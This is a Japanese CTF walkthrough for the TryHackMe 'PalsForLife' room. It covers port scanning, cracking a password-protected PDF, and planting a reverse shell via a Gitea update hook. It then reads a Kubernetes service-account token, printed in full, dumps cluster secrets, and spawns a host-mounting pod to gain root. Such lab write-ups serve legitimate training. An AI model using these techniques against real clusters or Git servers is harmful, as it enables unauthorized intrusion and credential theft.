# PalsForLife CTF

https://tryhackme.com/room/palsforlife

## Enumeration

```shell
TARGET=10.48.174.45
sudo bash -c "echo $TARGET   pals >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 64
6443/tcp  open  sun-sr-https syn-ack ttl 64
10250/tcp open  unknown      syn-ack ttl 64
30180/tcp open  unknown      syn-ack ttl 63
31111/tcp open  unknown      syn-ack ttl 63
31112/tcp open  unknown      syn-ack ttl 63
```

```sh
sudo nmap -sV -p22,6443,10250,30180,31111,31112 $TARGET

PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
6443/tcp  open  ssl/sun-sr-https?
10250/tcp open  ssl/http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
30180/tcp open  http              nginx 1.21.0
31111/tcp open  unknown
31112/tcp open  ssh               OpenSSH 7.5 (protocol 2.0)
```

- 31111 は、`Gitea - Git with a cup of tea`
- 6443 は K8S 関連

```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {
    
  },
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}
```

### ディレクトリ列挙

/teams ディレクトリを発見

```sh
root@ip-10-48-73-72:~# dirsearch -u http://pals:30180/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_pals_30180/__26-01-08_01-01-19.txt

Target: http://pals:30180/

[01:01:19] Starting: 
[01:02:21] 200 -   13KB - /team/
```

/team を表示してソースコードを見たら、PDFのBase64エンコードがあったので復元した。  
スワードがかかっていたので pdf2john, hashcat, rockyou.txt でクラックした。  
開いたらパスワードっぽい文字列が表示された。

## Gitea

gitea で新規ユーザー登録したら、leeroyユーザーを発見（leeroy@jenki.ns）。

PDFから入手したパスワードを使い、leeroyとしてログインできた。

updateフックにリバースシェルを追加し、READMEを変更してリバースシェル取得成功。

```sh
$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [192.168.129.39] from (UNKNOWN) [10.48.174.45] 33041
sh: can't access tty; job control turned off
/data/git/repositories/leeroy/jenkins.git $ id
uid=1000(git) gid=1000(git) groups=1000(git),1000(git)
```

```sh
/ $ cat Makefile
#Makefile related to docker

DOCKER_IMAGE ?= gitea/gitea
DOCKER_TAG ?= latest
DOCKER_REF := $(DOCKER_IMAGE):$(DOCKER_TAG)


.PHONY: docker
docker:
        docker build --disable-content-trust=false -t $(DOCKER_REF) .
# support also build args docker build --build-arg GITEA_VERSION=v1.2.3 --build-arg TAGS="bindata sqlite"  .

.PHONY: docker-build
docker-build:
        docker run -ti --rm -v $(CURDIR):/srv/app/src/code.gitea.io/gitea -w /srv/app/src/code.gitea.io/gitea -e TAGS="bindata $(TAGS)" webhippie/golang:edge make clean generate buil
```

K8Sトークン

```sh
/ $ cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6IkNtT1RDZkpCdzVWVjR2eVE2OVl3TGlya0tVZ21oY1NrTVBuUnUwb0JUU2sifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tcXM2aHAiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjhlYjIwMTIwLTQ1M2MtNDI3YS05ZDZiLTQyZmZlNDY3MGMzZCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mzW7wWtI8ch5EDMQEhCD3jY4g56CzhO1RPyHUx5bYF7ZJVKH_qdniY0watK8GoQXNeGJKp7vk2B68efG4UaWWMCiJR6vX_d7L3HxDSbHebbD2WL17AhDFXE8QDkuZ2mO_dLnKm_DBrMA2_63v5JQfXJnU-rjSD4Xq39_LVI106frHLqVkX-roHzY4fHGjYe8ys9pwuy7Wk3QCRrYfnyuuVpglKCPfaLLnUdgbVg-x7zGrK_4MB780V7TNdZ0pH0dpfTxyS7L5KeW8uKVsG0hsfBXABv-Q_BsGuvvotpdPzrsAWkBspRRsoOPq28Cfl6uOZBAx_djkHFv3vza54WS9w/
```

```sh
/ $ env | grep KUBERNETES
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
KUBERNETES_SERVICE_HOST=10.43.0.1
```

## kubectl

kubectlバイナリをコピーして、権限確認

```sh
/tmp $ ./kubectl auth can-i --list --token=${TOKEN}
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
            [*]                 []               [*]
```

### シークレット

```sh
/tmp $ ./kubectl get secrets -A
NAMESPACE         NAME                                                 TYPE                                  DATA   AGE
kube-system       ttl-controller-token-kl49c                           kubernetes.io/service-account-token   3      4y222d
kube-system       node-controller-token-mjlrr                          kubernetes.io/service-account-token   3      4y222d
kube-system       pod-garbage-collector-token-dzflc                    kubernetes.io/service-account-token   3      4y222d
kube-system       resourcequota-controller-token-g2pwj                 kubernetes.io/service-account-token   3      4y222d
kube-system       statefulset-controller-token-nqqdd                   kubernetes.io/service-account-token   3      4y222d
kube-system       certificate-controller-token-gmcw4                   kubernetes.io/service-account-token   3      4y222d
kube-system       endpointslicemirroring-controller-token-tffdc        kubernetes.io/service-account-token   3      4y222d
kube-system       root-ca-cert-publisher-token-cprft                   kubernetes.io/service-account-token   3      4y222d
kube-system       coredns-token-qb5sp                                  kubernetes.io/service-account-token   3      4y222d
kube-system       local-path-provisioner-service-account-token-tlfjs   kubernetes.io/service-account-token   3      4y222d
kube-system       palsforlife.node-password.k3s                        Opaque                                1      4y222d
kube-system       expand-controller-token-wrtrt                        kubernetes.io/service-account-token   3      4y222d
kube-system       pvc-protection-controller-token-pktqr                kubernetes.io/service-account-token   3      4y222d
kube-system       replication-controller-token-4hsp7                   kubernetes.io/service-account-token   3      4y222d
kube-system       namespace-controller-token-zl7qg                     kubernetes.io/service-account-token   3      4y222d
kube-system       generic-garbage-collector-token-68pxt                kubernetes.io/service-account-token   3      4y222d
kube-system       replicaset-controller-token-4kbp7                    kubernetes.io/service-account-token   3      4y222d
kube-system       endpointslice-controller-token-sfh7b                 kubernetes.io/service-account-token   3      4y222d
kube-system       horizontal-pod-autoscaler-token-cc47j                kubernetes.io/service-account-token   3      4y222d
kube-system       persistent-volume-binder-token-gcw5w                 kubernetes.io/service-account-token   3      4y222d
kube-system       pv-protection-controller-token-2z6hc                 kubernetes.io/service-account-token   3      4y222d
kube-system       job-controller-token-jh96z                           kubernetes.io/service-account-token   3      4y222d
kube-system       cronjob-controller-token-76j67                       kubernetes.io/service-account-token   3      4y222d
kube-system       clusterrole-aggregation-controller-token-d2v4m       kubernetes.io/service-account-token   3      4y222d
kube-system       endpoint-controller-token-lkk7j                      kubernetes.io/service-account-token   3      4y222d
kube-system       attachdetach-controller-token-7px9q                  kubernetes.io/service-account-token   3      4y222d
kube-system       service-account-controller-token-8cjgk               kubernetes.io/service-account-token   3      4y222d
kube-system       daemon-set-controller-token-lxjx7                    kubernetes.io/service-account-token   3      4y222d
kube-system       deployment-controller-token-dn784                    kubernetes.io/service-account-token   3      4y222d
kube-system       disruption-controller-token-8whb7                    kubernetes.io/service-account-token   3      4y222d
default           default-token-qs6hp                                  kubernetes.io/service-account-token   3      4y222d
kube-system       default-token-v7w56                                  kubernetes.io/service-account-token   3      4y222d
kube-public       default-token-jwfzw                                  kubernetes.io/service-account-token   3      4y222d
kube-node-lease   default-token-v5r8q                                  kubernetes.io/service-account-token   3      4y222d
default           sh.helm.release.v1.webpage.v1                        helm.sh/release.v1                    1      4y222d
kube-system       flag3                                                Opaque                                1      4y222d
kube-system       k3s-serving                                          kubernetes.io/tls                     2      4y222d
```

```sh
/tmp $ ./kubectl get secrets flag3 -n kube-system -o yaml
apiVersion: v1
data:
  flag3.txt: [REDACTED]
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Secret","metadata":{"annotations":{},"name":"flag3","namespace":"kube-system"},"stringData":{"flag3.txt":"flag{[REDACTED]}"},"type":"Opaque"}
  creationTimestamp: "2021-05-31T22:01:30Z"
  name: flag3
  namespace: kube-system
  resourceVersion: "591"
  uid: 599c6a8b-2a93-4253-a02c-6c0a7eccdc3f
type: Opaque
```

### pods

```sh
/tmp $ ./kubectl get pods -A
NAMESPACE     NAME                                      READY   STATUS    RESTARTS   AGE
kube-system   coredns-854c77959c-g255m                  1/1     Running   2          4y222d
default       gitea-0                                   1/1     Running   2          4y222d
default       nginx-7f459c6889-8slv2                    1/1     Running   2          4y222d
kube-system   local-path-provisioner-5ff76fc89d-2llm9   1/1     Running   2          4y222d
```

ホストをマウントするPodを起動

```sh
/tmp $ ./kubectl apply -f privesc.yml --token=${TOKEN}
pod/everything-allowed-exec-pod created

/tmp $ ./kubectl get pods
NAME                          READY   STATUS    RESTARTS   AGE
gitea-0                       1/1     Running   2          4y222d
nginx-7f459c6889-8slv2        1/1     Running   2          4y222d
everything-allowed-exec-pod   1/1     Running   0          8s
/tmp $ ./kubectl exec -it everything-allowed-exec-pod --token=${TOKEN} -- /bin/bash
Unable to use a TTY - input is not a terminal or the right kind of file
id
uid=0(root) gid=0(root) groups=0(root)
ls -al /host/root
total 20
drwx------  2 root root 4096 May 31  2021 .
drwxr-xr-x 23 root root 4096 May 27  2021 ..
lrwxrwxrwx  1 root root    9 May 31  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   30 May 31  2021 root.txt
```

## 残りのflag

### 1

Gitea のWebフックで、自分のPC向けにPOSTイベントを飛ばしたらシークレットが含まれていた。

### 2

リバースシェルを取ったとき、/root の中に入っていた。

## 振り返り

- Kubernetesの良い復習

## Tags

#tags:Kubernetes #tags:Gitea
